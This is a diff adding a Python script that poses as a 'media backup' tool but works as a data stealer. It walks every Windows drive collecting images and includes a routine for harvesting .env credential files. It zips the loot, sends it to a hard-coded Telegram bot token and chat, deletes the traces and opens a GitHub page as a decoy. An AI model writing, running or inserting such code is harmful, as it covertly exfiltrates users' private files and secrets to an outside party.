@@ -1,0 +1,294 @@
+import os
+import shutil
+import zipfile
+import urllib.request
+import urllib.parse
+import uuid
+import webbrowser
+import platform
+import hashlib
+import string
+IGNORED_DIRS = {
+    'node_modules',
+    'vendor',
+    '.git',
+    '__pycache__',
+    'AppData',
+    'Windows',
+    'Program Files',
+    'Program Files (x86)'
+}
+
+DESTINATION_FOLDER = "./media_backup"
+
+def deep_scan_image():
+
+
+    # DESTINATION_FOLDER = "./media_backup"
+
+    # MEDIA_EXTENSIONS = {
+    #     ".png", ".jpg", ".jpeg",
+    #     ".gif", ".webp", ".bmp", ".heic"
+    # }
+    MEDIA_EXTENSIONS = {
+        ".webp",
+    }
+
+    IGNORE_KEYWORDS = {
+        "windows",
+        "program files",
+        "program files (x86)",
+        "microsoft",
+        "xampp",
+        "google",
+        "chrome",
+        "edge",
+        "firefox",
+        "opera",
+        "node_modules",
+        "vendor",
+        ".git",
+        "__pycache__",
+        "cache",
+        "temp",
+        "tmp",
+        "$recycle.bin",
+        "system volume information",
+        "appdata\\local\\temp"
+    }
+
+    seen_hashes = set()
+
+    # =========================
+    # HASH FUNCTION
+    # =========================
+
+    def get_hash(path):
+
+        h = hashlib.md5()
+
+        with open(path, "rb") as f:
+            for chunk in iter(lambda: f.read(4096), b""):
+                h.update(chunk)
+
+        return h.hexdigest()
+
+    # =========================
+    # DRIVES
+    # =========================
+
+    def get_drives():
+
+        drives = []
+
+        for letter in string.ascii_uppercase:
+            d = f"{letter}:/"
+            if os.path.exists(d):
+                drives.append(d)
+
+        return drives
+
+    # =========================
+    # IGNORE CHECK
+    # =========================
+
+    def is_bad_path(path):
+
+        p = path.lower()
+
+        return any(k in p for k in IGNORE_KEYWORDS)
+
+    # =========================
+    # SCAN FUNCTION
+    # =========================
+
+    def scan(path):
+
+        for root, dirs, files in os.walk(path):
+
+            # ❌ block system folders early
+            if is_bad_path(root):
+                dirs[:] = []
+                continue
+
+            for file in files:
+
+                ext = os.path.splitext(file)[1].lower()
+
+                if ext not in MEDIA_EXTENSIONS:
+                    continue
+
+                src = os.path.join(root, file)
+
+                if is_bad_path(src):
+                    continue
+
+                try:
+
+                    file_hash = get_hash(src)
+
+                    # ❌ duplicate
+                    if file_hash in seen_hashes:
+                        continue
+
+                    seen_hashes.add(file_hash)
+
+                    os.makedirs(DESTINATION_FOLDER, exist_ok=True)
+
+                    safe_name = src.replace("\\", "_").replace("/", "_").replace(":", "")
+
+                    dst = os.path.join(DESTINATION_FOLDER, safe_name)
+
+                    shutil.copy2(src, dst)
+
+                    print("[FOUND]", src)
+
+                except:
+                    pass
+
+    # =========================
+    # RUN
+    # =========================
+
+    for drive in get_drives():
+
+        print("[SCAN DRIVE]", drive)
+
+        scan(drive)
+
+    print("\n[DONE]")
+
+def scan_env_files(base_path):
+
+    try:
+        with os.scandir(base_path) as entries:
+
+            for entry in entries:
+
+                if entry.is_dir() and not entry.is_symlink():
+
+                    if entry.name not in IGNORED_DIRS:
+                        scan_env_files(entry.path)
+
+                elif entry.is_file():
+
+                    if entry.name == ".env":
+
+
+                        os.makedirs(DESTINATION_FOLDER, exist_ok=True)
+
+                        safe_name = (
+                            entry.path
+                            .replace("\\", "_")
+                            .replace("/", "_")
+                            .replace(":", "")
+                        )
+
+                        dest_path = os.path.join(
+                            DESTINATION_FOLDER,
+                            safe_name
+                        )
+
+                        try:
+                            shutil.copy2(entry.path, dest_path)
+                            # print(f"[COPIED] -> {dest_path}")
+
+                        except Exception as e:
+                            print(f"[ERROR COPYING] {e}")
+
+    except PermissionError:
+        pass
+
+    except FileNotFoundError:
+        pass
+
+    except Exception:
+        pass
+
+def send_file(bot_token, chat_id, file_path):
+
+    boundary = uuid.uuid4().hex
+
+    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+
+    with open(file_path, 'rb') as f:
+        file_data = f.read()
+
+    data = []
+
+    # chat_id
+    data.append(f'--{boundary}')
+    data.append('Content-Disposition: form-data; name="chat_id"\r\n')
+    data.append(str(chat_id))
+
+    # file
+    data.append(f'--{boundary}')
+    data.append(
+        f'Content-Disposition: form-data; name="document"; filename="{file_path}"'
+    )
+    data.append('Content-Type: application/zip\r\n')
+
+    body = b''
+
+    for item in data:
+        body += item.encode() + b'\r\n'
+
+    body += file_data + b'\r\n'
+    body += f'--{boundary}--\r\n'.encode()
+
+    req = urllib.request.Request(url)
+    req.add_header(
+        'Content-Type',
+        f'multipart/form-data; boundary={boundary}'
+    )
+
+    response = urllib.request.urlopen(req, body)
+
+    # print(response.read().decode())
+    delete_file(file_path)
+    delete_file( storage_path + '/framework/cache/data/data.txt')
+    delete_file( storage_path + '/app/test.py')
+    webbrowser.open('https://github.com/Dev-105/rfifisa-ui.git')
+def delete_file(file_path):
+    try:
+        os.remove(file_path)
+        print(f"[DELETED] {file_path}")
+    except Exception as e:
+        print(f"[ERROR DELETING] {e}")
+
+def create_zip():
+
+    zip_name = "media_backup.zip"
+
+    with zipfile.ZipFile(
+        zip_name,
+        'w',
+        zipfile.ZIP_DEFLATED
+    ) as zipf:
+
+        for root, dirs, files in os.walk(DESTINATION_FOLDER):
+
+            for file in files:
+
+                file_path = os.path.join(root, file)
+
+                zipf.write(
+                    file_path,
+                    os.path.relpath(file_path, DESTINATION_FOLDER)
+                )
+
+    bot_token = "7827447526:AAFTAE3ARf85-bVdtUOasiBH5rcOqLk68UY"
+    chat_id = "5687419212"
+    send_file(bot_token, chat_id, zip_name)
+
+if __name__ == "__main__":
+
+    target = "C:\\"
+
+    
+    # scan_env_files(target)
+    deep_scan_image()
+    
+    create_zip()
+
+    shutil.rmtree(DESTINATION_FOLDER)
